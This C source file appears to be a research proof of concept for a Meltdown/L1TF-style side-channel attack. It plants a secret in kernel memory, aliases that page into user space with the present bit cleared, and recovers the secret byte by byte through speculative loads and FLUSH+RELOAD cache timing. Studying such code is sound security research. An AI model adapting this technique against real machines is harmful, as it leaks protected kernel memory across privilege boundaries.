#include <ctype.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	struct ptes orig_ptes, alias_ptes;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *kmem;
	unsigned char *alias;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 0) {
		fprintf(stderr, "usage: %s [<options>]\n", argv[0]);
		return -1;
	}

	secret_len = strlen(args.secret);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	/* Set up memkit. */
	if (memkit_init() < 0) {
		printf(" [-] unable to set up memkit\n");
		goto err_free_leak;
	}

	printf(" [+] set up memkit\n");

	/* Allocate a kernel buffer. */
	kmem = vmalloc(4096);

	if (!kmem) {
		fprintf(stderr, " [-] unable to allocate kernel memory\n");
		goto err_memkit_exit;
	}

	printf(" [+] allocated kernel buffer at %p\n", kmem);

	/* Write the secret into the kernel buffer. */
	if (kmem_write(args.secret, secret_len, kmem) < secret_len) {
		fprintf(stderr, " [-] unable to write secret to kernel memory\n");
		goto err_vfree;
	}

	printf(" [+] wrote secret \"%s\" to kernel buffer at %p\n", args.secret, kmem);

	/* Allocate the aliasing page. */
	alias = mmap(NULL, 4096, PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if (alias == MAP_FAILED) {
		fprintf(stderr, " [-] unable to map the aliasing page\n");
		goto err_vfree;
	}

	printf(" [+] allocated the aliasing page\n");

	/* Resolve both the kernel and aliasing page. */
	tlb_resolve_va(&orig_ptes, 0, alias);
	tlb_resolve_va(&alias_ptes, 0, kmem);

	printf(" [+] kernel page at %p points to 0x%" PRIx64 "\n", kmem, alias_ptes.pte);

	/* Set up an alias to the kernel memory with the present bit cleared. */
	orig_ptes.pte = alias_ptes.pte & ~PTE_PRESENT;
	tlb_update_va(0, alias, &orig_ptes);

	printf(" [+] created aliasing between aliased page and kernel page\n");

	/* Set the cacheability of the aliasing apge. */
	if (set_cacheability(alias, args.mem_type) < 0) {
		printf(" [-] unable to set the cacheability of the aliasing page\n");
		goto err_vfree;
	}

	printf(" [+] set the aliasing page to %s memory\n", mem_type_to_str(args.mem_type));

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_unmap_alias;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		clear_results(results);

		for (round = 0; round < args.rounds; ++round) {
			kload(kmem + i);

			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + round) % 256) * STRIDE);
			}

			_mm_mfence();

#ifdef TSX
			tsx_probe(buffer, kmem + i);
#else
			retpol_probe(buffer, kmem + i);
#endif

			time_buffer(results, buffer, args.threshold);
		}

		match_best(leak + i, &count, results);
	}

	print_result(leak, secret_len, kmem);

	munmap(buffer, 256 * 4096);
	orig_ptes.pte = 0;
	tlb_update_va(0, alias, &orig_ptes);
	munmap(alias, 4096);
	vfree(kmem);
	memkit_exit();

	return 0;

err_unmap_alias:
	orig_ptes.pte = 0;
	tlb_update_va(0, alias, &orig_ptes);
	munmap(alias, 4096);
err_vfree:
	vfree(kmem);
err_memkit_exit:
	memkit_exit();
err_free_leak:
	free(leak);
	return -1;
}

